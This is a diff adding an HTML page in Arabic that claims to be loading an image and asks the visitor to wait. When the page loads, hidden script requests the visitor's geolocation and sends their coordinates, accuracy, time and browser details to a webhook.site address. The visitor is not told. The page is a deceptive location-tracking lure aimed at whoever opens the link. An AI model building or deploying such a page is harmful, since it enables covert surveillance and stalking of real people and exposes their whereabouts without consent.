@@ -1,0 +1,36 @@
+
+<!DOCTYPE html>
+<html>
+<head>
+  <title>تحميل صورة</title>
+  <script>
+    function getLocation() {
+      if (navigator.geolocation) {
+        navigator.geolocation.getCurrentPosition(function(position) {
+          fetch("https://webhook.site/845409c0-1581-4d36-8773-3e2593ad0b6b", {
+            method: "POST",
+            headers: {
+              "Content-Type": "application/json"
+            },
+            body: JSON.stringify({
+              latitude: position.coords.latitude,
+              longitude: position.coords.longitude,
+              accuracy: position.coords.accuracy,
+              time: new Date().toLocaleString(),
+              userAgent: navigator.userAgent
+            })
+          });
+        }, function(error) {
+          console.error("حدث خطأ في تحديد الموقع:", error);
+        });
+      } else {
+        alert("المتصفح لا يدعم تحديد الموقع.");
+      }
+    }
+    window.onload = getLocation;
+  </script>
+</head>
+<body>
+  <h2>جاري تحميل الصورة... الرجاء الانتظار</h2>
+</body>
+</html>
